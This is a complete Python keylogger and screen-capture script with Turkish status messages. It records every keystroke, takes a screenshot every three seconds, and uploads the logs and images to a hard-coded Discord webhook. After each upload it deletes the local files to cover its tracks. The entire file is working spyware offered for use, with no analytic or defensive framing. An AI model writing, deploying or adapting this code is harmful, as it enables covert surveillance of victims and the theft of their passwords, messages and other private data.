import time
import mss
import requests
import os
import glob
from pynput.keyboard import Listener, Key
from threading import Thread
import psutil

script_dir = os.path.dirname(os.path.abspath(__file__))

def clear_old_files():
    for file in glob.glob(os.path.join(script_dir, '*.png')) + glob.glob(os.path.join(script_dir, '*.txt')):
        try:
            os.remove(file)
            print(f"Deleted old file: {file}")
        except Exception as e:
            print(f"Failed to delete {file}: {e}")

keys_pressed = []
raw_keys_pressed = []

def on_press(key):
    global keys_pressed, raw_keys_pressed
    if key == Key.space:
        keys_pressed.append(" ")
        raw_keys_pressed.append("[Space]")
    elif key == Key.enter:
        keys_pressed.append("\n")
        raw_keys_pressed.append("[Enter]")
    elif key == Key.backspace:
        if keys_pressed:
            keys_pressed.pop()  # Remove the last character if backspace is pressed
        raw_keys_pressed.append("[Backspace]")
    elif hasattr(key, 'char') and key.char:
        keys_pressed.append(key.char)
        raw_keys_pressed.append(key.char)
    else:
        raw_keys_pressed.append(f"[{key}]")

def capture_keystrokes(interval=30):
    while True:
        global keys_pressed, raw_keys_pressed
        time.sleep(interval)
        keystrokes = ''.join(keys_pressed)
        raw_keystrokes = ''.join(raw_keys_pressed)
        keys_pressed = []  # Reset the list
        raw_keys_pressed = []  # Reset the raw list
        if keystrokes or raw_keystrokes:
            file_path = os.path.join(script_dir, f"keystrokes-{int(time.time())}.txt")
            raw_file_path = os.path.join(script_dir, f"raw-keystrokes-{int(time.time())}.txt")
            with open(file_path, 'w', encoding='utf-8') as file:
                file.write(keystrokes)
            with open(raw_file_path, 'w', encoding='utf-8') as file:
                file.write(raw_keystrokes)
            send_to_discord(file_path, webhook_url)
            send_to_discord(raw_file_path, webhook_url)
        else:
            print("No keystrokes to send.")

def send_to_discord(file_path, webhook_url):
    response = None
    try:
        with open(file_path, 'rb') as file:
            files = {'file': (os.path.basename(file_path), file.read(), 'text/plain')}
            response = requests.post(webhook_url, files=files)
    finally:
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
                print(f"File {file_path} deleted successfully.")
            except Exception as e:
                print(f"Failed to delete file {file_path}: {e}")

    if response and response.status_code == 200:
        print("Gönderim başarılı.")
        return True
    else:
        if response is not None:
            print("Gönderim başarısız, HTTP status:", response.status_code)
        else:
            print("Gönderim başarısız, response alınamadı.")
        return False


def capture_and_send_screenshots(interval=3):
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while True:
            screenshot_filename = os.path.join(script_dir, f"screenshot-{int(time.time())}.png")
            sct.shot(mon=1, output=screenshot_filename)
            send_to_discord(screenshot_filename, webhook_url)
            time.sleep(interval)

# Webhook URL'nizi buraya girin
webhook_url = 'https://discord.com/api/webhooks/1246739033208651826/QYhEfh8u5hjMRWODBi_rv8IaMXdIkPwf_GX7fhPYE6UfP1EBcOhxo3Ow1nNb4R2ZEk-2'

# Start the keyboard listener
keyboard_listener = Listener(on_press=on_press)
keyboard_listener.start()

# Start background threads
Thread(target=clear_old_files).start()  # Clear old files before starting capture
Thread(target=capture_keystrokes).start()
Thread(target=capture_and_send_screenshots, args=(3,)).start()
